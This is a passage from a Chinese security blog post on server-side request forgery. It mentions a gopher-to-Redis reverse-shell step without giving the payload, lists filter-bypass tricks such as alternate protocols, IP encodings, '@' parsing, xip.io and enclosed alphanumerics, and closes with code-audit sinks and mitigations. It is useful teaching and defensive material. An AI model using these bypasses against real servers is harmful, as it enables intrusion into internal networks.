+<p>原因：替换回车换行为%0d%0a，空格以%20替换, HTTP包最后加%0d%0a`代表消息结束</p>
+</blockquote>
+<p>4.将得到的结果，替代<code>http://192.168.1.11/ssrf.php?url=gopher%3a%2f%2f127.0.0.1%3a6379%2f_payload</code>里面payload的位置得到</p>
+<p>5.然后直接在浏览器中访问，或者在kaili中执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl 完整的payload
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后就可以在攻击机上获得反弹的shell</p>
+<blockquote>
+<p>注意，以上利用方式，如果是ubuntu的系统，是无法成功的</p>
+</blockquote>
+<h2 id="ssrf漏洞防御绕过">SSRF漏洞防御绕过</h2>
+<h4 id="1利用各种其他协议">1.利用各种其他协议</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">file:///     file protocol <span class="o">(</span>任意文件读取<span class="o">)</span>     
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Dict://     
+</span></span><span class="line"><span class="cl">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;      
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SFTP://Sftp代表SSH文件传输协议（SSH File Transfer Protocol）或安全文件传输协议（Secure File Transfer Protocol）     
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">TFTP://   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">LDAP:// 或ldaps:// 或ldapi://      
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Gopher
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="2ip地址进制转换">2.IP地址进制转换</h4>
+<p>IP地址进行各种进制的转换（八进制/十六进制等）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">127.0.0.1
+</span></span><span class="line"><span class="cl">八进制：0177.0.0.1
+</span></span><span class="line"><span class="cl">十六进制：0x7f.0.0.1
+</span></span><span class="line"><span class="cl">十进制：2130706433
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="3利用">3.利用[::]</h4>
+<p>可以利用<code>[::]</code>来绕过localhost：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://<span class="o">[</span>::<span class="o">]</span>:80/  &gt;&gt;&gt;  http://127.0.0.1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="4利用">4.利用@</h4>
+<p><code>http://xxx.com@www.baidu.com/</code>与<code>http://www.baidu.com/</code>请求时是相同的，实际请求的是@之后的。</p>
+<p>但是在对@解析域名中，不同的处理函数存在处理差异，如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.aaa.com@www.bbb.com@www.ccc.com
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="5短网址">5.短网址</h4>
+<p>如：https://dwz.cn/</p>
+<p><a href="http://tool.chinaz.com/tools/dwz.aspx"target="_blank" rel="external nofollow noopener noreferrer">http://tool.chinaz.com/tools/dwz.aspx<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>等</p>
+<h4 id="6利用特殊域名">6.利用特殊域名</h4>
+<p>原理是DNS解析。</p>
+<p>xip.io可以指向任意域名，即</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">127.0.0.1.xip.io	<span class="c1"># 可解析为127.0.0.1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="7利用dns解析">7.<strong>利用DNS解析</strong></h4>
+<p>在域名上设置A记录，指向<code>127.0.1</code></p>
+<h4 id="8句号">8.<strong>句号</strong></h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">127。0。0。1  &gt;&gt;&gt;  127.0.0.1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="9302跳转">9.<strong>302跳转</strong></h4>
+<p>比如使用：https://tinyurl.com   等网站生成302跳转地址</p>
+<h4 id="10利用封闭式字符数字">10.利用封闭式字符数字</h4>
+<p>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &raquo;&gt; example.com</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#利用Enclosed alphanumericss </span>
+</span></span><span class="line"><span class="cl">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳  ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇  ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛  ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵  Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ  ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ  ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴  ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="11dnslog无回显注入">11.DNSlog无回显注入</h4>
+<h4 id="12加端口">12.加端口</h4>
+<p>若限制了子网段，可以添加 <code>:80</code> 端口绕过：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1:8080
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="13其他">13.其他</h4>
+<p>修改&quot;type=file&quot;为&quot;type=url&quot; 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF</p>
+<h2 id="ssrf漏洞代码审计">SSRF漏洞代码审计</h2>
+<h3 id="php中">PHP中</h3>
+<p>PHP中下面函数的使用不当会导致SSRF:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">curl</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_get_contents</span><span class="p">()</span>	<span class="c1"># 获取文档数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">fsockopen</span><span class="p">()</span>	<span class="c1">#  初始化一个套接字连接到指定主机
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">curl_exec</span><span class="p">()</span>	<span class="c1">#  获得curl会话的结果
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="java中">Java中</h3>
+<p>与PHP不同，Java中的SSRF仅支持<code>sun.net.www.protocol</code>协议下的所有协议：<code>http, https, file, ftp, mailto, jar 及netdoc</code>协议</p>
+<p>正由于上述原因，以及传入的url协议必须和重定向后的URL协议一直的原因，使得Java中的SSRF并不能像PHP中一样使用<code>gopher</code>协议来扩展攻击面</p>
+<p>对于Java来说：</p>
+<p>可以用file协议或nerdoc协议进行列目录操作；</p>
+<p>对于无回显的文件读取可以利用ftp协议进行带外攻击（注意java的版本，有的版本的java使用ftp协议也无法读取多行文件）</p>
+<h4 id="敏感函数">敏感函数</h4>
+<p>注意能够发起HTTP请求的类和函数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">HttpClient</span><span class="o">.</span><span class="na">execute</span><span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">HttpClient</span><span class="o">.</span><span class="na">executeMethod</span><span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">HttpURLConnection</span><span class="o">.</span><span class="na">connect</span><span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">HttpURLConnection</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">URL</span><span class="o">.</span><span class="na">openStream</span><span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">HttpServletRequest</span><span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">BasicHttpEntityEncosingRequest</span><span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">DefaultBHttpClientConnection</span><span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">BasicHttpRequest</span><span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">ImageIO</span><span class="o">.</span><span class="na">read</span><span class="o">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>出来以上函数，还需要关注更多的类，如HttpClient、URL类等，还要根据具体实际场景不同。</p>
+<h4 id="通常步骤">通常步骤</h4>
+<ol>
+<li>首先确定被审计的源程序有哪些功能（通常从其他服务器应用获取数据功能出现的概率较大）</li>
+<li>确定好功能后再审计对应功能的源代码，事半功倍</li>
+</ol>
+<h2 id="ssrf漏洞防护">SSRF漏洞防护</h2>
+<ol>
+<li>正确处理302跳转（在业务角度看，不能直接禁止302，而是对跳转的地址重新进行检查）或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址</li>
+<li>禁用不需要的协议(如：<code>file:///</code>、<code>gopher://</code>,<code>dict://</code>等)，限制协议为http、https，防止跨协议</li>
+<li>设置内网IP黑名单（正确判定内网IP、正确获取host）</li>
+<li>在内网防火墙上设置常见的Web端口白名单（防止端口扫描）</li>
+<li>统一错误信息，避免用户根据错误信息来判断远端服务器的端口状态</li>
+</ol>
+<h2 id="参考">参考</h2>
+<p><a href="https://zhuanlan.zhihu.com/p/73736127"target="_blank" rel="external nofollow noopener noreferrer">https://zhuanlan.zhihu.com/p/73736127<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2023-01-21&#32;16:47:23>更新于 2023-01-21&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/ssrf%E6%BC%8F%E6%B4%9E/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span><span><a href="https://github.com/shuai06/edit/main/content/posts/SSRF%e6%bc%8f%e6%b4%9e.md" title="编辑此页"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">编辑此页</a></span></div>
+      <div class="post-info-share">
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/ssrf/' class="post-tag">SSRF</a><a href='/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/' class="post-tag">基础漏洞</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/jsonp%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/" class="post-nav-item" rel="prev" title="jsonp介绍及其安全风险"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>jsonp介绍及其安全风险</a>
+      <a href="/xxe%E6%BC%8F%E6%B4%9E/" class="post-nav-item" rel="next" title="XXE漏洞">XXE漏洞<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="giscus">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="hugo-fixit/FixIt"
+            data-repo-id="R_kgDOGihPtQ"
+            data-category="General"
+            data-category-id="DIC_kwDOGihPtc4CApHX"
+            data-mapping="title"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.109.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">
+              <a href="http://geoer.cn"target="_blank" rel="external nofollow noopener noreferrer">剑胆琴心</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark_dimmed","lightTheme":"light"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"algoliaAppID":"YKOM6PKLUY","algoliaIndex":"index.zh-cn","algoliaSearchKey":"a44c110d3ac360be2c69cd79d34b77a8","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"watermark":{"content":"\u003cimg class=\"fixit-icon\" src=\"/images/avatar.png\" alt=\"FixIt logo\" /\u003e 剑胆琴心","enable":true,"height":21,"opacity":0.0125}};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
